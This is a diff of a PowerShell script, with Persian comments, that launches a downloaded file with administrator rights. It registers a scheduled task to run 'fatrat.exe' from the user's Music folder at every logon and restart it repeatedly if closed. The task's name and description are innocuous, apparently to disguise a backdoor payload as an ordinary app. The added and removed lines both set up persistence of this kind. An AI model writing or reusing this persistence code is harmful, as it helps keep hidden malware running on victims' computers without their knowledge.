@@ -12,35 +12,20 @@ Start-Process -FilePath $dest -Verb RunAs
 
 
 
-
+# مسیر فایل exe در فولدر Music یوزر
 $exePath = Join-Path $env:USERPROFILE "Music\fatrat.exe"
 
+# اکشن اجرای برنامه
 $action = New-ScheduledTaskAction -Execute $exePath
-$trigger = New-ScheduledTaskTrigger -AtStartup
 
-$settings = New-ScheduledTaskSettingsSet `
-    -RestartCount 9999 `
-    -RestartInterval (New-TimeSpan -Seconds 10) `
-    -AllowStartOnBatteries `
-    -ExecutionTimeLimit (New-TimeSpan -Hours 24)
+# تریگر اجرا در هر Logon
+$trigger = New-ScheduledTaskTrigger -AtLogOn
 
-Register-ScheduledTask `
-    -TaskName "CriticalProgramAutoRestart" `
-    -Action $action `
-    -Trigger $trigger `
-    -Settings $settings `
-    -Description "Keeps my essential program always running"
+# تنظیمات ری‌استارت در صورت بسته شدن برنامه
+$settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Seconds 20)
 
-
-
-
-
-
-
-
-
-
-
+# ساخت یا آپدیت تسک
+Register-ScheduledTask -TaskName "MyAppAutoRun" -Action $action -Trigger $trigger -Settings $settings -Force -Description "Auto-run app from Music folder on every logon with restart if closed"
 
 
     
